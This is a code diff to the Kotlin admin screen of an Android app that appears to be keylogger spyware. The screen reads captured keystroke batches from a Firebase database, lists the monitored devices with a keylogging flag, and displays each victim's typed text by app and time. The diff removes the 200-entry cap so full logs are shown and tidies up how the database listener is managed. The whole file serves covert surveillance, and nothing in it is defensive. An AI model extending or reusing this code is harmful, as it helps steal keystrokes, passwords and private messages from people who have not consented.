@@ -41,6 +41,9 @@ class AdminMainActivity : AppCompatActivity() {
     private lateinit var adapter: DeviceAdapter
     private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
 
+    private var devicesListener: ValueEventListener? = null
+    private var devicesRef: com.google.firebase.database.DatabaseReference? = null
+
     data class DeviceModel(
         val name: String,
         var keylogging: Boolean = true,
@@ -54,7 +57,7 @@ class AdminMainActivity : AppCompatActivity() {
                 val filtered = if (selectedAppFilter != null) {
                     rawEntries.filter { it.second == selectedAppFilter }
                 } else {
-                    rawEntries
+                    rawEntries.take(200) // Default last 200 logs on console
                 }
                 val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                 val sb = StringBuilder()
@@ -62,7 +65,16 @@ class AdminMainActivity : AppCompatActivity() {
                     val timeStr = timeFormat.format(Date(item.first))
                     sb.append("[$timeStr] ${item.second}: ${item.third}\n")
                 }
-                return if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded for ${selectedAppFilter ?: "device"}."
+                val totalCount = if (selectedAppFilter != null) {
+                    rawEntries.count { it.second == selectedAppFilter }
+                } else {
+                    rawEntries.size
+                }
+                return if (sb.isNotEmpty()) {
+                    "=== ${selectedAppFilter?.uppercase() ?: "ALL"} TELEMETRY (Showing ${filtered.size} of $totalCount total) ===\n\n$sb"
+                } else {
+                    "No telemetry recorded for ${selectedAppFilter ?: "device"}."
+                }
             }
 
         val appsTodayMap: Map<String, Int>
@@ -132,6 +144,13 @@ class AdminMainActivity : AppCompatActivity() {
         loadConnectedDevices()
     }
 
+    override fun onDestroy() {
+        super.onDestroy()
+        if (devicesListener != null && devicesRef != null) {
+            devicesRef?.removeEventListener(devicesListener!!)
+        }
+    }
+
     private fun filterDevices(query: String) {
         filteredDeviceList.clear()
         if (query.isBlank()) {
@@ -148,8 +167,12 @@ class AdminMainActivity : AppCompatActivity() {
     }
 
     private fun loadConnectedDevices() {
-        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
-        dbRef.addValueEventListener(object : ValueEventListener {
+        if (devicesListener != null && devicesRef != null) {
+            devicesRef?.removeEventListener(devicesListener!!)
+        }
+
+        devicesRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
+        devicesListener = object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 var totalEntriesCount = 0
                 val now = System.currentTimeMillis()
@@ -222,7 +245,8 @@ class AdminMainActivity : AppCompatActivity() {
             }
 
             override fun onCancelled(error: DatabaseError) {}
-        })
+        }
+        devicesRef?.addValueEventListener(devicesListener!!)
     }
 
     private fun parseTimestamp(value: Any?): Long? {
@@ -312,12 +336,11 @@ class AdminMainActivity : AppCompatActivity() {
 
                 // Sort newest on top
                 entries.sortByDescending { it.first }
-                val limitedEntries = entries.take(200)
 
                 val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
                     masterDeviceList[index].rawEntries.clear()
-                    masterDeviceList[index].rawEntries.addAll(limitedEntries)
+                    masterDeviceList[index].rawEntries.addAll(entries)
                     adapter.notifyItemChanged(index)
                 }
             }
@@ -374,7 +397,8 @@ class AdminMainActivity : AppCompatActivity() {
             // Filter Header & Back to All button state
             if (device.selectedAppFilter != null) {
                 holder.layoutFilterHeader.visibility = View.VISIBLE
-                holder.txtActiveFilter.text = "Filtering: ${device.selectedAppFilter}"
+                val totalForApp = device.rawEntries.count { it.second == device.selectedAppFilter }
+                holder.txtActiveFilter.text = "Filtering: ${device.selectedAppFilter} (Full Logs: $totalForApp)"
                 holder.btnBackToAll.setOnClickListener {
                     device.selectedAppFilter = null
                     notifyItemChanged(position)
@@ -445,7 +469,7 @@ class AdminMainActivity : AppCompatActivity() {
                 }
 
                 val nameTv = TextView(context).apply {
-                    text = "👉 $appName (Tap to filter)"
+                    text = "👉 $appName (Tap for full logs)"
                     setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 11f)
                     setTypeface(null, android.graphics.Typeface.BOLD)
                     setTextColor(Color.parseColor("#38BDF8"))
